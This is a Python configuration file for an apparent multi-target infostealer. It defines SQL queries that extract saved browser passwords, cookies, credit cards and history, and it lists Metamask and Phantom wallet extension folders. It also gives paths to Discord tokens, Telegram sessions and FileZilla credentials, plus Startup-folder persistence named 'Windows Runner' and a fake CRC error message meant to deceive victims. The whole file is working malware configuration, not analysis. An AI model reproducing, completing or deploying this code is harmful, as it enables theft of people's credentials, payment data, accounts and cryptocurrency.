from enum import Enum
from os import environ
from getpass import getuser
from re import compile, IGNORECASE, DOTALL


user_profile = environ["USERPROFILE"]
user = getuser()
user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"


class Browsers(Enum):
    CHROME = "Chrome"
    OPERA_GX = "Opera GX"
    OPERA_DEFAULT = "Opera Default"
    EDGE = "Microsoft Edge"
    BRAVE = "Brave"
    VIVALDI = "Vivaldi"


class ChromiumConfig:

    BookmarksRegex = compile(r'"name":\s*"([^\'\"]*)"[\s\S]*"url":\s*"([^\'\"]*)"', IGNORECASE + DOTALL)

    PasswordsSQL = "SELECT action_url, username_value, password_value FROM logins"
    CookiesSQL = "SELECT host_key, name, encrypted_value FROM cookies"
    CardsSQL = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
    HistorySQL = "SELECT url FROM visits ORDER BY visit_time DESC LIMIT 30000"
    HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"

    PasswordsData = "URL: {0}\nUsername: {1}\nPassword: {2}\n\n"
    CookiesData = "{0}\tTRUE\t/\tFALSE\t2538097566\t{1}\t{2}"
    CardsData = "Username: {0}\nNumber: {1}\nExpire Month: {2}\nExpire Year: {3}\n\n"
    HistoryData = "URL: {0}\nTitle: {1}\nLast Visit: {2}\n\n"
    BookmarksData = "Title: {0}\nUrl: {1}\n\n"

    WalletLogs = {
        Browsers.CHROME.value: [
            {
                "name": "Metamask",
                "folder": "nkbihfbeogaeaoehlefnkodbefgpgknn"
            },
            {
                "name": "Phantom",
                "folder": "bfnaelmomeimhlpmgjnjophhpkkoljpa"
            }
        ],
        Browsers.OPERA_GX.value: [
            {
                "name": "Metamask",
                "folder": "djclckkglechooblngghdinmeemkbgci"
            },
            {
                "name": "Phantom",
                "folder": "bfnaelmomeimhlpmgjnjophhpkkoljpa"
            }
        ],
        Browsers.OPERA_DEFAULT.value: [
            {
                "name": "Metamask",
                "folder": "djclckkglechooblngghdinmeemkbgci"
            },
            {
                "name": "Phantom",
                "folder": "bfnaelmomeimhlpmgjnjophhpkkoljpa"
            }
        ],
        Browsers.EDGE.value: [
            {
                "name": "Metamask",
                "folder": "ejbalbakoplchlghecdalmeeeajnimhm"
            },
            {
                "name": "Phantom",
                "folder": "bfnaelmomeimhlpmgjnjophhpkkoljpa"
            }
        ],
        Browsers.BRAVE.value: [
            {
                "name": "Metamask",
                "folder": "nkbihfbeogaeaoehlefnkodbefgpgknn"
            },
            {
                "name": "Phantom",
                "folder": "bfnaelmomeimhlpmgjnjophhpkkoljpa"
            }
        ]
    }


class MultistealerConfig:

    PoolSize = 5

    ZipName = f"{user}-st"
    StoragePath = rf"{user_profile}\AppData\stink"

    ChromePaths = (
        rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State",
        rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
    )

    OperaGXPaths = (
        rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable\Local State",
        rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
    )

    OperaDefaultPaths = (
        rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable\Local State",
        rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
    )

    MicrosoftEdgePaths = (
        rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data\Local State",
        rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
    )

    BravePaths = (
        rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State",
        rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
    )

    VivaldiPaths = (
        rf"{user_profile}\AppData\Local\Vivaldi\User Data\Local State",
        rf"{user_profile}\AppData\Local\Vivaldi\User Data",
    )


class SystemConfig:

    User = user
    IPUrl = "https://ipinfo.io/json"
    SystemData = "User: {0}\nIP: {1}\nMachine Type: {2}\nOS Name: {3}\nMachine Name on Network: {4}\nMonitor: {5}\nCPU: {6}\nGPU: {7}\nRAM:\n{8}\nDrives:\n{9}"


class SenderConfig:

    UserAgent = user_agent


class AutostartConfig:

    ExecutorPath = rf"{user_profile}\AppData\Roaming\Microsoft\Windows"
    AutostartName = "Windows Runner"
    AutostartPath = rf"{user_profile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"


class DiscordConfig:

    TokensPath = rf"{user_profile}\AppData\Roaming\Discord\Local Storage\leveldb"
    UserAgent = user_agent
    DiscordData = "Username: {0}\nEmail: {1}\nPhone: {2}\nBio: {3}\nToken: {4}\n\n"


class TelegramConfig:

    SessionsPath = rf"{user_profile}\AppData\Roaming\Telegram Desktop\tdata"


class FileZillaConfig:

    SitesPath = rf"{user_profile}\AppData\Roaming\FileZilla"
    DataFiles = ("recentservers.xml", "sitemanager.xml")
    FileZillaData = "Name: {0}\nUser: {1}\nPassword: {2}\nHost: {3}\nPort: {4}\n\n"


class MessageConfig:

    MessageTitle = "0x17"
    MessageDescription = "ERROR_CRC: Data error (cyclic redundancy check)."
